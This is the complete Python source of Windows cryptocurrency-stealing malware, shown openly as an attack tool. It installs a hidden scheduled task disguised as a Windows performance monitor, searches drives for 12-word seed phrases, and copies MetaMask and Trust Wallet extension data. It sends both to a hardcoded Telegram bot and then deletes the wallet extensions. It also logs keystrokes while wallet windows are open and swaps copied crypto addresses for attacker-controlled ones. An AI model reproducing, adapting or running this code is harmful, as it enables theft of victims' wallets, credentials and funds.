import os
import sys
import re
import shutil
import pyperclip
import win32clipboard
import psutil
import os
import requests
import telebot
import platform
from pynput.keyboard import Listener, Key
import threading
import time
import win32con
import win32gui
import pygetwindow as gw
import datetime
username = os.getlogin()
user_id = ""
def autorun():
    data = """
    function Gen-Task($eventid)
{
    $Service = new-object -ComObject("Schedule.Service")
    $Service.Connect()
    $RootFolder = $Service.GetFolder("\")
    $TaskDefinition = $Service.NewTask(0)
    $regInfo = $TaskDefinition.RegistrationInfo
    $regInfo.Description = 'Microsoft Windows performance monitor'
    $regInfo.Author = $taskRunAsuser
    $settings = $taskDefinition.Settings
    $settings.Enabled = $true
    $settings.StartWhenAvailable = $true
    $settings.Hidden = $true
    $Triggers = $TaskDefinition.Triggers
    $Trigger = $Triggers.Create(0)
    $Trigger.Id = $eventid
    $Trigger.Subscription = "<QueryList><Query Id='0'><Select Path='Application'>*[System[(EventID=$eventid)]]</Select></Query></QueryList>" 
    $Trigger.Enabled = $true    
    $Action = $TaskDefinition.Actions.Create(0)
    $Action.Path = 'C:\\Users\\%username%\\AppData\\Roaming\\sys.exe'
    $RootFolder.RegisterTaskDefinition('Windows Perflog',$TaskDefinition,6,$null,$null,3) | Out-Null    
}

function Find-Common-Events()
{
    $eventid = Get-Eventlog -Newest 500 -LogName Application | Group-Object -Property EventID -NoElement | Sort-Object -Property count -Descending | Select-Object -First 1 | Select -ExpandProperty Name
    Gen-Task($eventid)
}
Find-Common-Events
"""
    path = "sys.exe"
    print(path)
    destination = "C:\\Users\\"+username+"\\AppData\\Roaming\\"
    try:
        os.system(f"copy {path} {destination}")
    except:
        pass
    file = open("run.ps1", "w")
    file.write(data)
    file.close()
    shutil.copy("run.ps1", destination)
    os.system("powershell -ExecutionPolicy Bypass -File run.ps1")
    f = open("config.bat", "w")
    f.write("HEY_BITCHES")
    f.close()
    os.system(f"copy config.bat C:\\Users\\{username}\\AppData\\Roaming\\")

def sid():
    meta_edge = f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\Default\Extensions\ejbalbakoplchlghecdalmeeeajnimhm"
    meta_chrome = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
    trust_edge = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\Default\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"
    directory = ["C:\\Users\\", "D:\\"]
    data = "data"
    os.mkdir(data)
    for dir in directory:
        extensions = ".txt"
        for subdir, dirs, files in os.walk(dir):
            for file in files:
                if file.endswith(extensions):
                    try:
                        file_path = subdir + os.sep + file
                        f = open(file_path, "r")
                        content = f.read()
                        words = content.strip().split()
                        if len(words) == 12:
                            print(file_path)
                            shutil.copy(file_path, data)
                    except:
                        pass
    os.mkdir("meta")
    dir = "meta"
    os.system("taskkill /f /im chrome.exe")
    if os.path.exists(meta_chrome):
        os.system(f"copy {meta_chrome} meta")
        shutil.make_archive("meta", "zip", dir)
        shutil.rmtree(dir)
    else:
        pass
    shutil.make_archive("secret", "zip", data)
    shutil.rmtree(data)
    bot = telebot.TeleBot('6064388809:AAFhXbFJrkjQ_pjvs2GOE1jIBxTaSkt9yCU')
    system = platform.uname()
    sys = (system.system)
    ver = (system.version)
    proc = (system.processor)
    #ip = requests.get("https://api.ipify.org").text
    bot.send_message(user_id, "User"+ "" + " Online\nSystem: " + sys + " \nVersion: " + ver + "\nCP: " + proc)
    with open("secret.zip", "rb") as file:
        bot.send_document(user_id, file)
        file.close()
    with open("meta.zip", "rb") as meta:
        bot.send_document(user_id, meta)
        meta.close()
    os.remove("secret.zip")
    os.remove("meta.zip")
    try:
        os.remove("secret.zip")
        os.remove("meta.zip")
        shutil.rmtree(meta_chrome)
    except:
        pass
        
    os.system("taskkill /f /im msedge.exe")
    if os.path.exists(meta_edge):
        shutil.rmtree(meta_edge)
    elif os.path.exists(trust_edge):
        shutil.rmtree(trust_edge)
    else:
        pass
    fi = open("crazy.bat", "w")
    fi.write("SYKA_BLYAT")
    fi.close()
    os.system(f"copy crazy.bat C:\\Users\\{username}\\AppData\\Roaming\\")
def run_sid():
    if os.path.exists("config.bat"):
        pass
    else:
        autorun()
    if os.path.exists("crazy.bat"):
        pass
    else:
        sid()
run_sid()
def logger():
            filename = "log.bat"
            def on_press(key):
                f = open(filename, 'a')
                if hasattr(key, 'char'):
                    f.write(key.char)
                elif key == Key.space:
                    f.write(' ')
                elif key == Key.enter:
                    f.write('\n')
                elif key == Key.tab:
                    f.write('\t')
                else:
                    pass
                f.close()
            with Listener(on_press=on_press) as listener:
                listener.join()

def check():
    while True:
        windows = gw.getAllWindows()
        for window in windows:
            print(window.title)
            if "Trust Wallet" in window.title:
                print("Activate logger")
                logger()
            elif "MetaMask" in window.title:
                print("Activate logger")
                logger()
def send_log():
    const_time = 12
    date = datetime.datetime.now().time()
    if date.hour < const_time:
        bot = telebot.TeleBot("6064388809:AAFhXbFJrkjQ_pjvs2GOE1jIBxTaSkt9yCU")
        try:
            with open("log.bat", "rb") as file:
                bot.send_document(user_id, file)
                file.close()
                os.remove("log.bat")

        except:
            pass
send_log()

def buffer():
    while True:
        text = pyperclip.paste()
        phrase = text.split()
        if len(phrase) == 12:
            print(phrase)
            bot = telebot.TeleBot('6064388809:AAFhXbFJrkjQ_pjvs2GOE1jIBxTaSkt9yCU')
            message = ' '.join(phrase)
            bot.send_message(user_id, message)
            win32clipboard.OpenClipboard()
            win32clipboard.EmptyClipboard()
        else:
            pass
        if re.search("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", text):
            pyperclip.copy("bc1qjj6gx6aeetrwnq23lfcz94qr3wmy9we63dpeg8") #btc
        elif re.search("^0x[a-fA-F0-9]{40}$", text):
            pyperclip.copy("0xb47E30D638abeb4da622bddC47a4eDe4B852f8d3") # eth
        elif re.search("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", text):
            pyperclip.copy("DMRVwgk165NPZiWTJk6mSQuUobdTk5xZMd")  #doge
        elif re.search("^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$", text):
            pyperclip.copy("ADA")
        elif re.search("^D[A-NP-Za-km-z1-9]{35,}$", text):
            pyperclip.copy("TRON")
        elif re.search("^r[0-9a-zA-Z]{24,34}$", text):
            pyperclip.copy("XRP")
        elif re.search("^T[a-zA-Z0-9]{33}$", text):
            pyperclip.copy("LTC")
thread1 = threading.Thread(target=buffer)
thread2 = threading.Thread(target=check)
thread1.start()
thread2.start()
# добавить кейлогер и уход от диспечера задач
# добавить монитор метамаска
#$Action.Arguments = '/c C:\\Users\\jonny\\AppData\\Roaming\\corona.exe' C:\\Users\\jonny\\AppData\\Roaming\\f.exe
